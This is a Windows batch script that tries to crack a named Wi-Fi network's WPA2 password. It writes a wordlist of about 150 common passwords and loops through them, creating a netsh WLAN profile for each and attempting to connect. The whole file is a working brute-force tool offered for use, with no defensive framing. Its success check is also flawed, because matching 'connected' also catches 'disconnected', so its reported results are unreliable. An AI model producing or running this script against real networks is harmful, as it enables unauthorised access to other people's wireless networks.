@echo off
setlocal enabledelayedexpansion

:: Scan for available Wi-Fi networks
echo Scanning for available Wi-Fi networks...
netsh wlan show networks mode=bssid

:: Prompt user to enter the target Wi-Fi SSID
set /p ssid=Enter the target Wi-Fi SSID: 

:: Check if the SSID is empty
if "%ssid%"=="" (
    echo SSID cannot be empty!
    exit /b
)

:: Create a temporary password file with a wordlist
echo Creating password wordlist...
echo password123 > passlist.txt
echo admin123 >> passlist.txt
echo welcome123 >> passlist.txt
echo qwerty123 >> passlist.txt
echo testpassword >> passlist.txt
echo mywifi >> passlist.txt
echo letmein >> passlist.txt
echo 12345678 >> passlist.txt
echo secret123 >> passlist.txt
echo 11111111 >> passlist.txt
echo 99026185 >> passlist.txt
echo Creating password wordlist...
echo 123456 >> passlist.txt
echo password >> passlist.txt
echo 12345678 >> passlist.txt
echo 12345 >> passlist.txt
echo 123456789 >> passlist.txt
echo qwerty >> passlist.txt
echo 1234 >> passlist.txt
echo 1q2w3e4r >> passlist.txt
echo abc123 >> passlist.txt
echo 11111111 >> passlist.txt
echo letmein >> passlist.txt
echo sunshine >> passlist.txt
echo admin >> passlist.txt
echo welcome >> passlist.txt
echo monkey >> passlist.txt
echo 123321 >> passlist.txt
echo 123123 >> passlist.txt
echo 1234567 >> passlist.txt
echo iloveyou >> passlist.txt
echo 123 >> passlist.txt
echo 123123123 >> passlist.txt
echo qwertyuiop >> passlist.txt
echo 123qwe >> passlist.txt
echo 1qaz2wsx >> passlist.txt
echo 123abc >> passlist.txt
echo 1qazxsw2 >> passlist.txt
echo 1234567890 >> passlist.txt
echo 123456a >> passlist.txt
echo letmein123 >> passlist.txt
echo 1234abcd >> passlist.txt
echo passw0rd >> passlist.txt
echo password1 >> passlist.txt
echo qwerty123 >> passlist.txt
echo 12345abc >> passlist.txt
echo 1qaz@wsx >> passlist.txt
echo qwe123 >> passlist.txt
echo abcdef >> passlist.txt
echo welcome1 >> passlist.txt
echo qwerty1 >> passlist.txt
echo 1234qwer >> passlist.txt
echo 1q2w3e >> passlist.txt
echo zxcvbnm >> passlist.txt
echo superman >> passlist.txt
echo football >> passlist.txt
echo baseball >> passlist.txt
echo sunshine123 >> passlist.txt
echo starwars >> passlist.txt
echo iloveyou123 >> passlist.txt
echo 1234abcd >> passlist.txt
echo password123 >> passlist.txt
echo 123456789a >> passlist.txt
echo 12345678a >> passlist.txt
echo qwerty456 >> passlist.txt
echo 1q2w3e4r5t >> passlist.txt
echo 987654321 >> passlist.txt
echo 1qaz2wsx3edc >> passlist.txt
echo dragon >> passlist.txt
echo 1111 >> passlist.txt
echo 1234abcd >> passlist.txt
echo abcdefgh >> passlist.txt
echo iloveyou2 >> passlist.txt
echo 12345password >> passlist.txt
echo welcome123 >> passlist.txt
echo 1q2w3e4r5t6y >> passlist.txt
echo qwertz >> passlist.txt
echo qwerty12345 >> passlist.txt
echo 1a2b3c4d >> passlist.txt
echo trustno1 >> passlist.txt
echo 12345678910 >> passlist.txt
echo test123 >> passlist.txt
echo 1234qwer >> passlist.txt
echo abc123456 >> passlist.txt
echo 654321 >> passlist.txt
echo 123abc456 >> passlist.txt
echo mypassword >> passlist.txt
echo 123456qwerty >> passlist.txt
echo monkey123 >> passlist.txt
echo password1! >> passlist.txt
echo 12345qwerty >> passlist.txt
echo 1234abcde >> passlist.txt
echo 987654 >> passlist.txt
echo 121212 >> passlist.txt
echo 1q2w3e4r5t6 >> passlist.txt
echo abcdefg >> passlist.txt
echo 12345abcd >> passlist.txt
echo qwe12345 >> passlist.txt
echo 1qaz2wsx3edc4rfv >> passlist.txt
echo 112233 >> passlist.txt
echo 12345678901 >> passlist.txt
echo qazwsx >> passlist.txt
echo qwerty789 >> passlist.txt
echo 1qaz1qaz >> passlist.txt
echo 234567 >> passlist.txt
echo 123456789abc >> passlist.txt
echo 12345qwert >> passlist.txt
echo pass1234 >> passlist.txt
echo 1234567890qwerty >> passlist.txt
echo superuser >> passlist.txt
echo hello123 >> passlist.txt
echo welcomehome >> passlist.txt
echo admin >> passlist.txt
echo admin123 >> passlist.txt
echo 1234 >> passlist.txt
echo root >> passlist.txt
echo guest >> passlist.txt
echo default >> passlist.txt
echo letmein >> passlist.txt
echo changeme >> passlist.txt
echo password >> passlist.txt
echo pass >> passlist.txt
echo admin@admin >> passlist.txt
echo 12345678 >> passlist.txt
echo 1q2w3e >> passlist.txt
echo toor >> passlist.txt
echo 1234567 >> passlist.txt
echo 123 >> passlist.txt
echo abc123 >> passlist.txt
echo qwerty >> passlist.txt

:: Loop through each password in the wordlist
for /f "tokens=*" %%p in (passlist.txt) do (
    echo Trying password: %%p

    :: Generate a temporary Wi-Fi profile XML file for the current password
    echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> > temp_wifi_profile.xml
    echo ^<name^>%ssid%^</name^> >> temp_wifi_profile.xml
    echo ^<SSIDConfig^> >> temp_wifi_profile.xml
    echo     ^<SSID^> >> temp_wifi_profile.xml
    echo         ^<name^>%ssid%^</name^> >> temp_wifi_profile.xml
    echo     ^</SSID^> >> temp_wifi_profile.xml
    echo ^</SSIDConfig^> >> temp_wifi_profile.xml
    echo ^<connectionType^>ESS^</connectionType^> >> temp_wifi_profile.xml
    echo ^<connectionMode^>auto^</connectionMode^> >> temp_wifi_profile.xml
    echo ^<MSM^> >> temp_wifi_profile.xml
    echo     ^<security^> >> temp_wifi_profile.xml
    echo         ^<authEncryption^> >> temp_wifi_profile.xml
    echo             ^<authentication^>WPA2PSK^</authentication^> >> temp_wifi_profile.xml
    echo             ^<encryption^>AES^</encryption^> >> temp_wifi_profile.xml
    echo             ^<useOneX^>false^</useOneX^> >> temp_wifi_profile.xml
    echo         ^</authEncryption^> >> temp_wifi_profile.xml
    echo         ^<sharedKey^> >> temp_wifi_profile.xml
    echo             ^<keyType^>passPhrase^</keyType^> >> temp_wifi_profile.xml
    echo             ^<protected^>false^</protected^> >> temp_wifi_profile.xml
    echo             ^<keyMaterial^>%%p^</keyMaterial^> >> temp_wifi_profile.xml
    echo         ^</sharedKey^> >> temp_wifi_profile.xml
    echo     ^</security^> >> temp_wifi_profile.xml
    echo ^</MSM^> >> temp_wifi_profile.xml
    echo ^</WLANProfile^> >> temp_wifi_profile.xml

    :: Attempt to add the Wi-Fi profile
    netsh wlan add profile filename="temp_wifi_profile.xml" >nul 2>&1

    :: Attempt to connect using the generated profile
    netsh wlan connect name="%ssid%" >nul 2>&1

    :: Wait for 10 seconds to see if the connection was successful
    timeout /t 10 >nul

    :: Check if the connection was successful
    netsh wlan show interfaces | findstr /i "State" | findstr "connected" >nul 2>&1
    if !errorlevel! == 0 (
        echo.
        echo Password found: %%p
        echo Cleaning up temporary files...
        del passlist.txt
        del temp_wifi_profile.xml
        pause
        exit /b
    ) else (
        echo Connection failed with password: %%p
    )
)

echo.
echo No valid password found in the list.
del passlist.txt
del temp_wifi_profile.xml
pause
